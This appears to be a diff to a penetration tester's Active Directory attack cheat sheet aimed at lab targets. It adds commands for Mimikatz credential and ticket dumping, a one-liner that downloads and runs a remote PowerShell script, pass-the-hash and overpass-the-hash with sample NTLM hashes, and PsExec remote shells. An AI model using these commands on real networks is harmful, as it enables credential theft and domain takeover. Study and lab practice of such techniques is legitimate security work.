@@ -52,6 +52,7 @@ Users are core of AD and DC's task is to manage access of those users to service
 * `net user /domain` returns a list of users to work with
 * `net user some_admin /domain` info about some_admin
 * `net group /domain`
+* `net accounts` lookup AD password policy
 
 #### Domain Controller Discovery
 For more details see: https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/how-domain-controllers-are-located
@@ -206,7 +207,18 @@ Source Link: https://www.tarlogic.com/blog/how-to-attack-kerberos/
 
 Most of the AD attacks shall require hash or ticket that can be only extracted with SYSTEM rights from the target host.
 
+```powershell
 
+#engage the SeDebugPrivlege
+privilege::debug
+
+#dump the credentials of all logged-on users using the Sekurlsa
+sekurlsa::logonpasswords
+
+#dump tickets
+sekurlsa::tickets
+
+```
 
 
 ```powershell
@@ -216,6 +228,52 @@ Most of the AD attacks shall require hash or ticket that can be only extracted w
 https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1
 
 ```
+
+### Request Service Ticket
+
+If name of particular service is know, ticket can be requested for later attempting to crack its hash.
+
+```powershell 
+
+iex(New-Object Net.WebClient).DownloadString('http://192.168.119.181/Request_ST.ps1')
+
+#list all user tickets
+
+klist
+
+```
+
+* after this the service can be accessed 
+
+### Pass the Hash
+
+If hash is obtained from the memmory of compromised host, use it with pth-winexe kali tool
+
+```bash
+
+pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
+```
+
+### Overpass the Hash
+
+This attack uses NTLM hash to obtain a TGT to gain further access
+
+```bash
+#use mimikatz to obtain powershell session as admin if NTLM hash is available
+
+sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe
+
+```
+
+* sometimes it is needed to authenticate with current session to obtain TGT
+
+`net use \\dc01`
+
+after that DC shall provide a TGT
+
+* use psexec to gain remote access
+
+`.\PsExec.exe \\dc01 cmd.exe`
 
 ### Brute Force ASREP roast
 
@@ -249,13 +307,13 @@ https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-
 ```
 
 
-## Remote Shell
+### Remote Shell
 
 * RPC: `evil-winrm -i 10.10.10.xxx -u 'xxx'  -p 'xxx' `
 * SMB: use some exploit from SMB cheat sheet
 
 
-## Generic All
+### Generic All
 
 If some user or group has "Generic All" Permission on any of the other objects than this object can be easily compromised.
 
@@ -308,7 +366,7 @@ smbexec.py support.htb/administrator@dc.support.htb -no-pass -k
 source> https://cybergladius.com/htb-walkthrough-support/
 
 
-## Dsync Attack
+### Dsync Attack
 Read about dsync here: https://book.hacktricks.xyz/windows/active-directory-methodology/dcsync
 
 * Find accounts with permissions for DSync using **powerview**
@@ -334,7 +392,7 @@ PSexec can also be yused from windows client
 
 `.\PSExec.exe \\dc1.domain.com cmd`
 
-## Kerberoasting
+### Kerberoasting
 
 * If local access is give then use Rubeus: 
 
@@ -367,9 +425,22 @@ Rubeus.exe kerberoast </spn:user@domain.com | /spns:user1@domain.com,user2@domai
 * And finally, crack the hash
 `hashcat -a 0 -m 13100 --force SPN.hash /wordlists/rockyou.txt`
 
-## Pass the Ticket
+### Pass the Ticket
 
-Short annotation of how it works follows:
+#### No TGT provided
+
+1. Obtain SID of the domain
+
+```powershell
+
+whoami /user
+
+# SID are all numbers execpt the last four (rel identifier) 
+
+```
+
+
+#### If TGT provided
 
 * dump TGT from LSASS
 * use TGT toact as domain admin by injecting it into current login sessions ID
